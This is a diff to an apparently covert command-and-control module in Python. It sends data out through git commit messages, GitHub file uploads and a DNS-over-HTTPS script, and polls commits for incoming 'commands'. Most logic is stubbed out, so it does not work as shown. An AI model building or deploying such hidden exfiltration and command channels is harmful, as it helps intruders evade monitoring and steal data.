@@ -31,6 +31,15 @@ def send_commit_message(msg):
 		subprocess.run(["bash","transmit_msg.sh", USER, REPO, msg[:50]])
 		msg=msg[50:]
 
+def get_commit_message():
+	""" Pulls the directory and checks the commit log for changes (new commands) """
+	subprocess.run(["bash","pull_commits.sh", USER, REPO])
+	with open("commitlog","r") as f:
+		# parse for commands
+		pass
+		with open("commitlog.prev","w") as prev:
+			prev.write(f.read())
+
 def send_git_file(fname):
 	""" Upload a file to the github """
 	subprocess.run(["bash","push_file.sh", USER, REPO, fname])
@@ -44,7 +53,8 @@ def send_https_file(file, dest, resolver):
 	subprocess.run(["bash","doh_send.sh", file, dest, resolver]) #Can't call the command directly from python for some reason
 
 def send(body, is_file=False):
-	""" Based on network conditions, choose an appropriate way to transmit a message """
+	""" Based on network conditions and msg size, choose an appropriate way to transmit a message """
+	
 	if False:
 		send_commit_message(body)
 	elif False:
@@ -54,7 +64,7 @@ def send(body, is_file=False):
 	pass
 
 def recv(remote_url):
-	""" Based on network conditions, choose an appropriate way to send the file """
+	""" Based on network conditions and msg size, choose an appropriate way to send the file """
 	if False:
 		get_https_file()
 	pass
